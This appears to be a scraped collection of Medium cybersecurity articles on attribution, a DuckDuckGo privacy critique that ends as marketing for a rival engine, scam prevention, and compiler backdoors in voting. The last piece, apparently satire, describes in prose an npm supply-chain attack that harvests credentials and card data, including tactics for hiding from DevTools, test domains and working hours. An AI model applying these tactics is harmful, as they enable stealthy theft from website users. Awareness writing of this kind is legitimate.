The level of attribution required to prove a cyber event was orchestrated by a particular threat actor is pretty high. There needs to be a level of transparency that is sufficient to convince the population that an attribution is accurate. No one wants to start a shooting war, or massive escalation, over a case of mistaken identity.
The problem with transparency is that it will invariably reveal sources and methods which the adversary can then use to improve their own security. For example, if the evidence is an audio recording of General Baddeed saying “hack company XYZ and steal their secret formula.” Well, General Baddeed’s security team is going to be looking for audio bugs in his office within the hour. And that will be the last time anyone learns anything about what General Baddeed discusses in his office! Is “proving” that General Badeed was responsible for the theft of Company XYZ’s secret formula worth the cost of not knowing what General Baddeed says in the future? Unless you’re Company XZY (who probably doesn’t get a say in the matter), the answer is “nope.”
Another problem is that much of the cyber intelligence analysis and production is done by private companies these days. Not only do they want to keep their sources and methods safe from the opposition, they also have a fiduciary duty to their share holders to protect their trade secrets. Consequently, they don’t really want to reveal too much of how they arrived at their conclusions. It may damage their position in the market, probably directly aid their competition, and will certainly aid the opposition.
Yet another problem is that frequently the level of “proof” in an intelligence based investigation is not quite to the “smoking gun” level that, for example, a normal person would expect. It will probably be a bunch of circumstantial evidence, a complexity of timelines, snippets of information from various sources with different levels of confidentiality and reliability. This patchwork of data needs to be processed and analyzed via complicated techniques designed to reduce cognitive bias. All of this, only to arrive at a sort of high probability of “maybe”. “Given this available data, this is the range of conclusions that fit, and this particular one seems the most likely, maybe.” Hardly something you’d feel comfortable starting a war over.
Complicating matters further still, a number of high profile misattributions in the past has undermined public confidence in cyber attribution. Indeed, Intelligence failures in general have reduced the credibility of Intelligence based statements with the public.
If the opposition is capable of creating sufficient doubt about attribution, for example by following the Russian Maskirovka doctrine, then it’s hard to see how to get the population to support escalation. The days when the FBI could get away with just saying “trust me” are long gone.
Establishing “plausible deniability” in the face of accusations of launching a cyberattack is always a potential option. “Fear of retaliation is low and there’s not much deterrence,”
How exactly deterrence would work seems “left as an exercise to the reader.” So how does one nation state deter another from conducting cyber operations? If DPRK is behind the SWIFT hacks, as allegedly they were behind the Sony hack, what nation state level tools are available to deter them? What is Bangladesh supposed to do to deter DPRK from stealing millions? How does the US deter Russia from conducting offensive “active measure” campaigns, if they are purely executed in the cyber domain? Unless theres a full escalation chain to MAD war.
Essentially, for deterrence to be effective it needs buy-in from the population. That requires a lot of transparency about the attribution process, including data which might come from valuable sources and methods that are irreplaceable. And even then, there is still no guarantee people will trust it or believe it.
It is a law of intelligence that no information should be given away, it must be traded for something of equal of greater value. With the low probability of public acceptance, the not unreasonable possibility of misattribution, and the near certainty of exposing valuable sources and methods; the incentives are not aligned for a sufficiently transparent attribution.
I personally believe the problem comes from a poor conceptual understanding of the cyber domain. The best work on this was years ago, and that has been discarded for this “how is a cyber like a nuke?” mentality. NATO says they will respond with kinetic force against cyber attacks, and yet they don’t even know what a cyber attack looks like. Good luck with that.
Written by
",['Cybersecurity']
I Found This Flaw in DuckDuckGo - Christian Stewart ✔️ - Medium,https://medium.com/@stewofkc/i-found-this-flaw-in-duckduckgo-9558877ae170?source=tag_archive---------1-----------------------,"DuckDuckGo is a private search engine. It is adamant about spreading privacy around the internet. However, there is one issue we discovered that raises privacy concerns. Your search terms, while they may be sent over your network in an encrypted form, show up in plain text in browsing history.
DDG may work well for reducing advertiser tracking, avoiding filter bubbles, and limiting data profiling, however as this post explains, it may not offer the protection from surveillance organizations that some think.
DuckDuckGo, along with many other private search engines, saw a massive influx of users after Edward Snowden sparked general interest in privacy, specifically from government surveillance agencies. Snowden endorsed the use of private search tools for their lack of tracking. However, he also endorsed the use of other data protection measures to create a complete privacy suite. Snowden explains that no privacy tool, or system, is perfect. But more privacy is a good thing, across the board, even if it doesn’t quite protect you from all angles.
While DuckDuckGo may not track my searches or link them to my personal information, this is a clear lack of privacy. As a private search engine, DuckDuckGo gives the expectation of privacy. But anyone with access to your computer can view your searches, in plain-text in your browsing history. If any user, or person with access to my computer, can view my search history, there is a clear conflict with the privacy claims that DDG delivers.
By comparison, StartPage and Search Encrypt don’t display search terms in your history. If you try to go to the links in your history, you will be returned to the search engine’s homepage. That is not the case for DuckDuckGo and Google, which take you right back to the results you were viewing before.
This may seem like a minor issue, because users could just clear their history. However, privacy by design means that the most private settings are enabled by default. This extra step makes privacy inconvenient, and the product less user friendly. Privacy by design is essential, especially for privacy based products. The expectation of private search engines is that they deliver on their privacy promises, in this case, DuckDuckGo has failed.
One of DuckDuckGo’s features that many of its users find attractive is “bangs”. These are like shortcuts that you can use to search other websites directly from DuckDuckGo. Say, for example, you want to search for something on Amazon, you can do so directly from the search engine rather than having to navigate to Amazon first by typing ‘!’ and then selecting Amazon.
Unfortunately the functionality of “bangs” is often misrepresented and misunderstood. There is an expectation of privacy when using DuckDuckGo. Bangs are represented as a way to search other websites on the internet with the “privacy protection” of DDG, but this is not the case. If you use DuckDuckGo and use bangs to search Google, there is no additional privacy protection. This is the same as going directly to Google and searching from there. Google can still track your search and the metadata associated with it.
It’s confusing to us why DuckDuckGo, if it’s focused on privacy would provide a tool that directly takes people away from a private environment back into Google’s data collection. There is no warning message or prompt that let’s users know that using bangs redirects them to sites that track their data. If DuckDuckGo is going to carry the name of a “private” search engine, they should put that into practice from end-to-end and not just selectively.
DuckDuckGo has a well-established hold on the “private search” market. Its users are extremely loyal to the private search engine. It is feature rich for a privacy-focused tool, which not a lot of privacy tools are. It has a sleek and modern feeling design which makes for a user-friendly experience. All of this is great but it’s still not Google. Google is superior in almost every way, except that Google tracks you and your searches. However, since DuckDuckGo has these privacy flaws, it’s just not worth switching from Google.
While DuckDuckGo is certainly another option for searching the web, it is not a totally private search engine. It has some privacy protection measures in place, but you should be able to trust that DuckDuckGo will protect your privacy, since their company is based around it. As a result, you can either trust Google’s extremely advanced security or put your privacy in the hands of DuckDuckGo which has overlooked a few key points. When it comes to private search engines, DuckDuckGo is another option, but is not the best. Search Encrypt and StartPage both use much more advanced encryption measures and they are enabled by default.
Sometimes a school or business network will block DuckDuckGo because there is a misconception that if you’re using a privacy-based search engine you’re likely looking up things you shouldn’t. While people familiar with the importance of privacy see the issue, schools and businesses choose to block DuckDuckGo. Your school may see DuckDuckGo as a way to get around their content filters. If your school blocks DuckDuckGo, you should check to see if other private search engines are also blocked. In many cases, alternatives to DuckDuckGo are still accessible.
If you’re using DuckDuckGo because you’re concerned about keeping your searches private, it probably isn’t the best choice. DuckDuckGo doesn’t track your search terms to create data profiles about you, but it doesn’t use the level of encryption that we do. Search Encrypt is a private search engine and has some of the industry’s leading encryption measures. There are too many great privacy-friendly products available to use just mediocre or incomplete tools. There are many alternatives to Google and DuckDuckGo that offer more complete and responsible privacy protection.
Originally published at choosetoencrypt.com on March 28, 2018.
Written by
","['Privacy', 'Duckduckgo', 'Search Engines', 'Technology', 'Cybersecurity']"
"If You’re Online, You’re Getting Scammed - The New New - Medium",https://medium.com/s/thenewnew/if-youre-online-you-re-getting-scammed-7cd91350722d?source=tag_archive---------2-----------------------,"You’re not paranoid, you’re careful. At least that’s what you tell yourself. You run the most robust antivirus software, dropping $40 each year for the latest version. You use two-factor identification (2FA) on any website that offers it. You read Krebs on Security. And while most people use passwords, you use passphrases; they’re all more than 20 characters and include capital letters, lowercase letters, numbers, and the odd special character. Not only are your passphrases more secure than complex passwords, but you can also remember “2$hy2$hyhu$hu$heye2eye” much better than “s7Y%2b#&sg.”
Not that you need to. You use a password locker and change the master passphrase on your account every month. Your phone has a six-digit passcode that you change each day. You set the tightest privacy settings on your social media accounts months ago, then, in a moment of clarity, you deleted the accounts altogether. You never communicate personal information via email, picking up the phone anytime you need to share so much as your date of birth. And when you do make calls or send texts, you use an encrypted service.
You are, without doubt, much better protected than nearly everyone else on the planet. But you’re still not safe. Scammers are constantly evolving their techniques and exploiting vulnerabilities both technological and psychological. As soon as the security industry puts the clamps on one method of conning people, the scammers find a new one, leaving even the most tech-savvy susceptible to attack.
“Anyone who thinks they’re above it is really fooling themselves,” says Steve Weisman, who covers the latest in tech frauds on Scamicide.com. “The person who thinks they can’t be scammed is the best target,” he adds. Here are five ways they could be taken.
Despite decades of warnings and millions of victims, people are still falling for email scams “because scammers are becoming more and more creative,” says Ana Dascalescu of Heimdal Security, a global security firm based in Denmark.
Last year, a sophisticated Google Docs phishing attack duped millions into turning over access to their Gmail accounts. And while everyone thinks they can spot a Nigerian prince scam, also known as 419 fraud, that old standby has evolved beyond the mistake-laden messages blasted out to the easily duped.
In May, cybersecurity firm Crowdstrike reported on the latest scam from Nigeria’s bustling confidence-game sector. The “business email compromise” (BEC) is a hyperfocused “spear phishing” campaign that targets specific companies. Scammers first infiltrate a firm’s email system. Once they have access, they monitor how a company operates. They steal legitimate documents, and then they pounce.
“There will be an email from the CEO saying, ‘I want to complete this transaction. And I want you to wire this to a bank in Singapore,’” says Chris Bronk, a cybersecurity expert at the University of Houston, describing the typical path of a BEC. The scammer relies on his ability to spoof a real invoice and a subordinate’s deference to their boss. When the con works, the employee will dutifully follow the orders from their “boss” and send money to a scammer’s account before realizing they’ve been duped.
The broad strokes of this scam aren’t new, but this iteration is working now more than ever, with the FBI reporting in the July that $12 billion has been lost globally due to the scam.
Password protection: Preventing this con starts with denying scammers access to a company’s email system. If they can’t steal a real invoice, they won’t be able to make a convincing fake one.
Strict password policies are a good place to start. They should be complex, varied, and stored in a password locker such as LastPass, Dashlane, or Keeper. These services aren’t without their risks, but you “have to believe in someone,” Dascalescu says. “And it beats the alternative of having the same loose password across all accounts.”
Physical keys: If passwords are compromised, a physical key could still shut down a scammer. Google has had success with this amped-up version of two-factor authentication, which replaces the single-use text messages most banks used to confirm identity with a plastic key that’s inserted into a USB port. In July, the tech giant claimed that after a year of requiring users to use physical keys, not one of its more than 85,000 employees had their account taken over. “That’s one of the big revolutions in terms of authentication,” Dascalescu says of the keys. “They’re tiny, extremely affordable devices that eliminate all the chance of someone getting into your account via traditional phishing methods.”
Skepticism: Not every company is Google. For those firms, it’s essential that people know the classic signs of a suspicious email. They can be filled with spelling and grammar mistakes, promise something that’s too good to be true, or appear threatening. And some scammers stay well-informed, says Eugene Spafford, a computer science professor at Purdue University. “Many will look to see what’s been in the news. If there’s a disaster, they’ll fake aid relief.”
Dangerous links can be identified before clicking by scrutinizing the URL. If it looks suspicious, don’t click. Of course, scammers have found ways around this. Homographic attacks occur when scammers create email addresses or URLs that look legitimate but include indistinguishable lookalike letters in place of the expected ones. A capital “I” may be replaced by a lowercase “l,” or Cyrillic letters could be used in place of English ones. This particular con cost one of Australia’s richest men $1 million last year after his assistant was duped by an email that came from an account one character off from his.
Anyone with the slightest bit of web savvy would have no trouble ignoring an email from an unknown sender claiming to have a recording of them watching porn. But what if the sender revealed that they knew a password you’ve used before? Would that spook you?
That’s what the people behind one of 2018’s biggest scams are hoping when they try to get victims to fork over a ransom to prevent lurid videos from being shared with their contacts. The key to pulling off this increasingly popular scam — the FBI says it received 13,000 complaints in July alone — is convincing victims that the threat of exposure is real.
That’s where the old password, also obtained from a data breach, comes in. “There are a lot of people who are very nervous, who don’t have unique passwords on every site, who may give in,” Weisman says. Once they do, they’ll fork over thousands of dollars to retain their privacy.
Cover your webcam: In addition to regularly updating your passwords and never reusing them, a simple, rudimentary step can prevent victims from falling for this scam. Place a piece of electrical tape over your webcam, and you’ll know that no matter what weird stuff you’re doing in front of your laptop, no one is watching.
There was a time when the most dangerous thing that could be lurking on the other end of a phone call was a 12-year-old asking for Jacques Strap. Not any more. Phone calls remain the most popular method of contact for financial scams, and by 2019, half of all calls to mobile phones will be scams, according to communications firm First Orion.
They’re only getting more sophisticated. Modern voice phishing calls will come from a number you recognize. Your bank, perhaps, calling to say there’s a problem with your debit card. The security appears to have been breached, the polite voice will say.
They’ll ask for account information, such as your PIN, or the three-digit security number on the back of your card. If you hesitate—and you should—they may try to ease your worries by confirming their identity. They’ll read off the last four digits of your Social Security number, something you’d assume only your bank would have, and hope you let down your guard.
You shouldn’t, says Weisman. “They’re providing you with information to make them appear legit,” he says. And most likely, the information will be correct. Scammers are scooping up personal data from companies such as Equifax, which exposed the sensitive information of 143 million people last year. By itself, that data isn’t terribly lucrative. But scammers know how to put it to use, opening up what Weisman calls a “brave new world” of possibilities.
Hang up: If a bank or credit card company calls and starts probing for personal account information, that should set off red flags, Weisman notes. “There’s never a reason for the bank to ask for your PIN or CCV. They have that information.”
Spafford says if someone calls from a bank or other financial institution, you should never give away any personal information on that particular call. “You should ask for their name or the case number. Hang up, look up the phone number, call them back, and ask for that person to verify that it’s really them.”
These days, the process of verifying a bank’s phone number isn’t as easy as it might seem. One common mistake, says Dascalescu, is plugging a number into Google in hopes of verifying it. “Scammers are highjacking Google results,” she notes. “No one should believe Google results.”
Call back, but confirm the number first: Pull out a bill and call the number printed on it. Or flip over your credit card and call the number on the back. But be careful when dialing. “Some scammers have purchased phone numbers that are one digit off from the legitimate number,” Weisman says.
Download an app: It’s a good idea to add your name to the National Do Not Call Registry, but don’t expect that to protect you from every bad actor. Downloading a third-party app such as Hiya, Truecaller or Robokiller will help close the gap. These apps check incoming calls against a database of millions of numbers used by spammers, scammers, and robocallers. If they find a match, they reject the calls before your phone rings.
They phish via email, they phish over the phone, and yes, scammers phish via text. Since the technique is not as well known, people aren’t always as suspicious of scammy texts as they should be, Weisman says.
These attacks are particularly successful because we’ve gotten used to receiving legitimate information via text. Banks allow consumers to receive text alerts, which trains us to trust the messages. This is generally a good thing, Bronk says, because it allows banks to quickly make sure it’s actually you buying those Guess jeans at an outlet mall. Or not, in Bronk’s case. “I can’t wear Guess jeans,” he says.
Scammers know we’re used to this method of communication, however, and they exploit it. “A savvy attacker is one who says, ‘This is something you do all day, and I’m going to inject one these decisions into this for my purposes,’” Bronk explains.
Never click: Don’t reply to texts from unknown senders, and never click on suspicious links. If these scams are done well, though, they won’t be obvious. There are apps, such as VeroSMS and SMS Shield, that will block some spam texts from getting through, but financial institutions also have a role to play here, Weisman points out.
“They have to do a much better job of alerting consumers of these problems,” he says. “Banks should say, ‘No, we’re not going to be calling. We’re not going to be asking for personal information.’ I just think they don’t do enough.”
The stories have been around for years. High-tech hackers are walking around crowded places stealing credit information with radio frequency identification skimmers. They’re called electronic pickpockets, and a whole market of RFID-blocking wallets, purses, and even jackets has cropped up to thwart them. These solutions appeal to the tech-savvy consumer. Turns out, however, that there’s very little evidence that this is a problem. In this case, it’s not the shadowy scammer conning victims out of their money, it’s the people purporting to protect them.
Don’t bother: Since it’s not happening, there’s no need to avoid it. But if you’re ultra cautious, Dascalescu says there is product that’s less expensive and more effective that the RFID-blocking wallets in SkyMall. “Any piece of aluminum foil would work,” she says.
And now the bad news: While it’s worth taking steps to avoid getting scammed, there’s a certain futility to it all. “Scam artists are the only criminals we calls artists,” Weisman says. “They have a knowledge of psychology that Freud would envy.”
That doesn’t mean people should let their guard down, but it does mean accepting that everyone is vulnerable, even cybersecurity experts. “By commenting in this article, I’m opening myself up to attack,” Bronk says. “Someone will be like, ‘He doesn’t think he can get hacked. I’m going to do it.’ That’s why I’ll flat out say it: Someone could certainly do something to my accounts if they wanted to.”
Written by
About this Magazine
","['Scam', 'Fraud', 'Technology', 'Phishing', 'Cybersecurity']"
I’m a Computer Scientist. Here’s Why You Should Never Trust a Computer.,https://medium.com/s/story/i-am-a-computer-scientist-and-i-am-here-to-tell-you-to-never-trust-a-computer-with-anything-5a506c470d64?source=tag_archive---------1-----------------------,"It’s 2018. We live in the future. We can order a pizza, watch it get made, and watch it get delivered to our house. So why can’t we vote online?
Let’s start with some background on what programming languages are, and why we need them. Soon, you’ll see why you should never want to vote online (and why you never want a computer anywhere near you when you’re voting).
You probably know computers run on binary, 1s and 0s. And writing in binary is hard—so hard, in fact, that basically nobody wants to do it. Even if you succeed in doing it, what you’re producing is just a bunch of numbers, and it’ll be very hard for anyone—including you in a few weeks, once you forget what you wrote—to figure out what your code actually does.
So instead, we computer scientists invented “machine languages.” These are abstractions that change binary code into something that’s at least a little closer to languages humans speak. They’re still basic, but they’re a step in the right direction. Machine languages are based on—and tied to—the hardware of whatever machine they’re designed for. So while you can’t say something easy like “add 10 and 20 together and print that result to the screen,” you can say “place the value 10 in register one, place the value 20 in register two, feed both these registers into adder one, and put the output in register three, and print the contents of register three to the screen.” The machine language is then translated—this is called “compiled”—into the binary 1s and 0s required to actually run on your computer.
There are obvious downsides here: You need to be familiar with your computer’s hardware to write in a machine language, and every computer’s architecture is slightly different. Plus, you have to explicitly specify every step of the process. That’s a pain. But the upside is that when you’re looking at a program written in machine language down the road, what’s happening is much clearer—especially compared to looking at an endless stream of 1s and 0s in binary.
No matter what you write, you’re trusting the compiler to accurately turn what you wrote into binary code. If I wanted to mess with your results, all I’d need to do is mess with your compiler.
The next step up is to abstract away the hardware, so you don’t actually need to know the location of things like “adders” and “registers.” If you build a smart enough compiler, you can design machine-independent programming languages, with more abstract instructions that could easily handle things like “add 10 and 20 together, and print that result to the screen.” You’d then rely on the compiler to translate that into machine language and then into binary.
While all of these programming languages take different approaches to solving this problem, they share the same goal: to make computer code easier for humans to read, which makes it easier to understand and easier to maintain. Programming languages today make printing the result of 10+20 as simple as writing this:
print 10+20
Did you spot the reason you can’t trust any computer?
I’ll give you a hint: It’s there in the compiler.
No matter what you write, you’re trusting the compiler to accurately turn what you wrote into binary code. If I wanted to mess with your results, all I’d need to do is mess with your compiler.
For example, if I changed the “print” command so it always added 1 to the numbers you gave it, your program wouldn’t run properly—even though you programmed it correctly. You’d never find the glitch just by looking at your source code because that’s not where the glitch is. It’s hidden in the compiler.
That example is basic and you’d detect it pretty quickly because your program would obviously be broken. But what if I did something more subtle? What if instead of messing with the “print” command, I changed the compiler so that whenever it detected code involving passwords, it made it so the password “ryaniscool” also worked?
It’s not the end of the world if someone hacks in and sees my pizza being delivered. Nobody cares enough to try to break it. But voting is not one of those cases.
If I did that, I’d have what’s called a “back door” into every computer program you build with my compiler. In other words, you can lock your front door all you want, but it doesn’t matter because I have a secret door around back nobody knows about. No matter what you write, no matter how secure your password code is, my password of “ryaniscool” is also going to work—and you won’t even know it.
Obviously, this is a problem. And you might think, “But compilers are computer programs like any other. I could look at the source code of my compiler to make sure there’s no malicious code there. All I’d need to do is find the part that talks about adding ‘ryaniscool’ as a password, take it out, and I’d be fine. Right?”
And you could. Except, as you said, compilers are computer programs like any other. And that means they themselves are compiled.
Here’s all I’d need to do to exploit that:
As before, I’d write code that adds “ryaniscool” as a valid password to anything it compiles and put this in the compiler. At this point, I’m adding a back door to anything the compiler compiles, but I’ll get caught if anyone looks at the source of my compiler. So I go on to Step 2.
I write code for the compiler that detects when it’s compiling itself, and when that happens, it adds in the code for step 1 into the compiler. Now, when I compile the compiler, it makes a new version of itself that will add in compiler instructions for how to insert the “ryaniscool” password whenever the compiler is rebuilt. And to cover my tracks, all I’d need to do is remove the malicious instructions from the compiler source, and I’m done.
Whenever the compiler is rebuilt, it’ll build itself such that it’ll contain instructions to add my back door. Whenever that compiler builds something else, it’ll follow those instructions and build my back door right in. And there won’t be a single line of malicious code left in any source code that reveals it.
The only way to detect this bug is to go over the binary code yourself—a task that starts out hard and becomes literally impossible as programs become more complex. The complete works of William Shakespeare come in at under 6 megabytes. The Firefox browser alone requires 200 megabytes just to install it, and that’s only one program on your computer. There is not a human alive who has read all 200 megabytes of that code. It’s not even written in a language designed for humans to read.
Why are we using these nightmare machines?
None of this is new. In 1984, Ken Thompson—the man who designed and implemented Unix, the progenitor of the operating systems most computers and phones run on—presented a paper called “Reflections on Trusting Trust” and reached this conclusion:
The moral is obvious. You can’t trust code that you did not totally create yourself… No amount of source-level verification or scrutiny will protect you from using untrusted code.
By “totally create yourself,” Ken doesn’t just mean a program that you wrote, but one you wrote the entire stack for: everything down to the compiler. Very few people have the time, skills, and money to build a computer from the ground up, including all the software on it. This would seem to be a bullet in the head for trusting computers with anything.
And yet, we trust computers with all sorts of things. So, what gives? Why are we using these nightmare machines?
Well, for one thing, computers are really fun and convenient. And they’re practical in a lot of ways. Besides, a compiler hack can be tricky to pull off in practice: You’d need time and motivation to target someone. The truth is, there are many cases where you don’t need absolute trust in your computer: After all, it’s not the end of the world if someone hacks in and sees my pizza being delivered. Nobody cares enough to try to break it.
But voting is not one of those cases.
The only safe-ish way to vote with a computer is one in which a paper ballot is printed in sight of the voter, approved, and then stored in a ballot box.
Voting is a case where the outcome of a hack can have huge effects. Voting is also relatively easy to target (you know when and where it’s going to happen), and there’s a very strong motivation to alter the outcome. As easily as I could add that “ryaniscool” password, I could change the “add” command so that, when it was tallying votes, it added some extra for the party of my choice.
How much should I add? Honestly, at this point, it’s entirely up to me. Hence this conclusion: Online voting will never be safe. Computer voting will never be safe.
The only safe-ish way to vote with a computer is one in which a paper ballot is printed in sight of the voter, approved, and then stored in a ballot box. That way, if someone thinks the computer systems were compromised—if there’s any reason at all to suspect someone added the votes improperly—then there’s a paper trail. In other words, the computer adding up the votes is a convenience, nothing more. The real vote, the real power, still lies in the paper ballot.
Without that paper trail, you’re left trusting the computer.
And nobody should ever trust a computer.
There’s been some recurring themes in the discussion around this essay, so I thought I’d incorporate them here in Q+A format! The essay above has not been altered, but I thought the below might be useful if you’d like to do some more reading on this subject!
Q: What do you mean by computer voting?
A: I’m talking about a system in which you exclusively vote on a computer: no paper trail is generated. In this case, the computer is the authority on what you voted: there’s no other source you can double check.
An ethical and safer way to use computers in voting is to use them not as an authority, but as a convenience. If you vote on a paper ballot, and a computer scans that to add up a result, you can feel safer, because if anything goes wrong there’s still a physical paper trail. If you vote on a computer but then it prints out a paper ballot, which you have to confirm as being accurate before your vote is recorded, then you can feel safer too, because in both these situations the computer is a convenience. It’s when the computer becomes an authority that the problems arise.
Q: Couldn’t this be fixed by giving each person who votes a secret code, or some sort of key, or maybe we could biometrically scan their eyes or fingerprints or something? Or what if we backed up the votes somewhere on the internet the second they were made?
A: Nope. Codes and keys can be intercepted or duplicated, and any biometric scanner would be a computer, vulnerable to the exact same issues discussed here. And any networked system — in which the computer shares it vote to “back it up” somewhere else — again depends on that not being tampered. Sorry.
Q: Okay, but maybe we could test our programs and see if our compiled code acts differently than what we expect?
A: This doesn’t work for a couple of reasons. Sure, in my “change the value of what 10+20 adds up to” example, that’d be easy to test and catch any changes. But even if you thought to test that in the first place — and why would you? — that still doesn’t solve the problem. My malicious code could detect when it’s being tested and do nothing bad, only becoming active when you’re not looking.
Sounds like scifi, right?
Well, it’s already been done: in the 2015 Volkswagen emissions scandal, the car’s onboard computers detected when their emissions were being tested and ran in a low-power environmentally friendly mode, and switched to a high-power polluting mode when the test was over. The computers detected when they were being tested, acted on their best behaviour, and then stopped when the test was over. This scandal cost Volkswagen $18.32 billion to fix, by the way, not including the $2.8 billion dollar fine they paid.
The only reason Volkswagen would do this in the first place is because it’d be profitable to them and they thought they wouldn’t get caught. The same incentives apply to an election.
Q: If I’m forced to vote on a computer, does that mean I shouldn’t vote?
A: No, you should absolutely vote anyway. The purpose of meddling in an election is to disenfranchise you. If you don’t vote, you’re disenfranchising yourself already with 100% efficiency. Go vote, and afterwards, do what you need to do to ensure you never have to use computer voting ever again.
Q: Does this mean we shouldn’t trust computers for anything?
A: In an absolute sense: yes. You should not have 100% faith in any computer system. But that’s obviously not practical, and in most cases, you don’t need to have 100% faith in a computer. One of the few cases in which you would is in voting. The next question goes into this in more detail.
Q: Come on. We do banking online, billions of dollars moves digitally every day, and you even wrote this on a computer. Surely you’re being alarmist and/or hypocritical?
A: This is where the idea of absolute trust comes in. I don’t absolutely trust computers, but I do bank online. But that’s because, if something goes wrong, the bank can fix it afterwards. You use a credit card, knowing there’s a chance your information could be stolen — but if that happens, you have trust the credit card company will fix it. And they will — because the profit they make from you using their card everyday makes up for the expense for covering for fraud and broken software.
But there’s no way to correct a broken election after the fact.
It’s all a matter of compromise: publishing this online was convenient, and I did it knowing that my words could be altered. There’s a risk they could be — but in the end, it’s not the end of the world. Low stakes, and the benefits outweigh the downsides. Similarly, I do banking online — because it’s also convenient, and I’m willing to compromise because I know that while there’s a chance my data and/or money could be stolen, I feel relatively assured the bank will cover it. And yes, I use computers to send friends $10 to pay them back for dinner, but I do it because the stakes are so low. It’s just $10.
The stakes are not low when it comes to voting.
And an electoral system — a democracy — is not the sort of thing you want to be compromising on.
Q: What about blockchain? You should’ve mentioned blockchain .That’s a new technology that didn’t exist in 1984 and that could definitely solve this problem.
A: Nope, nope, nope. Sorry. I wish it worked too.
Q: You don’t know what you’re talking about, and who made you an authority? Why should I trust you?
A: Like I say in the essay, these aren’t my brilliant original ideas. I’m basically rephrasing what Ken Thompson argued in 1984 in his Reflections on Trusting Trust paper. Ken’s argument is actually stronger: his example is the login program, an analogue of which is used in just about every computer. I’m just talking about voting. Ken’s paper has stood as a seminal paper in computer science for over 30 years, but it’s not well-known outside computer science circles. That’s why I wanted to write this essay.
(Incidentally, there is a way to correct for the issues Ken raised and I paraphrased: you could compile your code twice, once with a new compiler and once with a known-good compiler. If you compare the two outputs and they’re the same, you know your compiler is good. This, of course, raises the question of where you’d get that known-good compiler from — here’s a PhD thesis on that subject).
Q: Okay, sure this is pretty dour, but this is all hypothetical. We use computers to control nuclear reactors, for crying out loud. If things weren’t safe, we’d know about it.
A: An attack very similar to the one discussed here — in which the evidence of the attack was hidden — was done in real life just a few years ago, with the Stuxnut worm in 2010. And that attacked — you guessed it — nuclear centrifuges.
These attacks are already happening. Whoops.
Q: Computer voting may be bad, but paper ballots can be altered too, you know. They’re not perfect either.
A: Absolutely. But paper ballots have a few huge advantages: their downsides are well understood (nobody is writing big essays on why you paper can’t be trusted), and their vulnerabilities are limited to physical access.
If I want to mess with a paper ballot election, I need to either steal ballots, or alter ballots, or stuff ballot — either way, I need physical access to that ballot box. And that limits the amount of damage one bad actor can do. A bored teen half the world away can’t effect a paper ballot election from his basement. The same can’t be said for computer voting.
And, on top of all of this, there’s a simple fact: programmers aren’t perfect. Even if the attack in this essay isn’t used, that doesn’t mean your computer voting system is secure. Heck, Google — who I think we can all agree hire some very smart people — have a bounty system in which they pay you cash money if you help them find bugs in their own software, because they can’t guarantee they haven’t made mistakes.
Software programming is hard. Computers are hard. Even a brilliant, well-intentioned software developer can make a single mistake that opens up an entire software stack to intrusion. The Heartbleed bug was introduced by accident in 2011 — in open source software that in theory anyone on the planet could’ve looked at, examine, and detected — but it was not found until 2014, at which 17% of the servers on the internet were now vulnerable.
That was done by accident. Imagine what someone can do if they were trying.
Look, I know it sucks to hear that computer voting is bad. It sucks to line up outside, in physical space, when it’s so easy to imagine just voting on an app on your phone on your lunch break and be done with it. But more important than an election being convenient is it being accurate, and while computer voting sure would be convenient, I hope I’ve convinced you that you should not trust it to be accurate.
Q: Is there a relevant xkcd?
A: There is always a relevant xkcd.
Written by
","['Programming', 'Politics', 'Cybersecurity', 'Elections', 'Technology']"
I’m harvesting credit card numbers and passwords from your site. Here’s how.,https://medium.com/hackernoon/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5?source=tag_archive---------0-----------------------,"The following is a true story. Or maybe it’s just based on a true story. Perhaps it’s not true at all.
It’s been a frantic week of security scares — it seems like every day there’s a new vulnerability. It’s been a real struggle for me personally to pretend like I understand what’s going on when asked about it by family members.
Seeing people close to me get all flustered at the prospect of being “powned” has really put things in perspective for me.
So, it is with a heavy heart that I’ve decided to come clean and tell you all how I’ve been stealing usernames, passwords and credit card numbers from your sites for the past few years.
The malicious code itself is very simple, it does its best work when it runs on a page that meets the following criteria:
Then, when there’s a blur event on a password/credit card field, or a form submit event is heard, my code:
In short, if it looks like data that might be even remotely valuable to me, I send it off to my server.
Of course, when I first wrote this code, back in 2015, it was of no use at all sitting on my computer. I needed to get it out into the world. Out into your site.
In some wise words from Google:
If an attacker successfully injects any code at all, it’s pretty much game over
XSS is too small scale, and really well protected against.
Chrome Extensions are too locked down.
Lucky for me, we live in an age where people install npm packages like they’re popping pain killers.
So, npm was to be my distribution method. I would need to come up with some borderline-useful package that people would install without thinking — my Trojan horse.
People love pretty colours — it’s what separates us from dogs — so I wrote a package that lets you log to the console in any colour.
I was excited at this point — I had a compelling package — but I didn’t want to wait around while people slowly discovered it and spread the word. So I set about making PRs to existing packages that added my colourful package to their dependencies.
I’ve now made several hundred PRs (various user accounts, no, none of them as “David Gilbertson”) to various frontend packages and their dependencies. “Hey, I’ve fixed issue x and also added some logging.”
Look ma, I’m contributing to open source!
There are a lot of sensible people out there that tell me they don’t want a new dependency, but that was to be expected, it’s a numbers game.
Overall, the campaign has been a big success and my colourful console code is now directly depended on by 23 packages. One of those packages is itself depended upon by a pretty widely used package — my cash cow. I won’t mention any names, but you could say it’s left-padding the coffers.
And this is just one package. I have 6 more on the boil.
I’m now getting about 120,000 downloads a month, and I’m proud to announce, my nasty code is executing daily on thousands of sites, including a handful of Alexa-top-1000 sites, sending me torrents of usernames, passwords and credit card details.
Looking back on these golden years, I can’t believe that people exert so much effort messing around with cross-site scripting just to get code into a single site. It’s so easy to ship malicious code to thousands of websites, with a little help from my web developer friends.
Where would you notice them? My code won’t send anything when the DevTools are open (yes even if un-docked).
I call this the Heisenberg Manoeuvre: by trying to observe the behaviour of my code, you change the behaviour of my code.
It also stays silent when running on localhost or any IP address, or where the domain contains dev, test, qa, uat or staging (surrounded by \b word boundaries).
What hours do they work? My code doesn’t send anything between 7am and 7pm weekdays. It halves my haul, but 95% reduces my chances of getting caught.
And I only need your credentials once. So after I’ve sent a request for a device I make a note of it (local storage and cookies) and never send for that device again. Replication is not made easy.
Even if some studious little pen tester clears cookies and local storage constantly (on the weekends), I only send these requests intermittently (about one in seven times, lightly randomised — the ideal trouble-shooting-insanity-inducing frequency).
Also the URL looks a lot like the 300 other requests to ad networks your site makes.
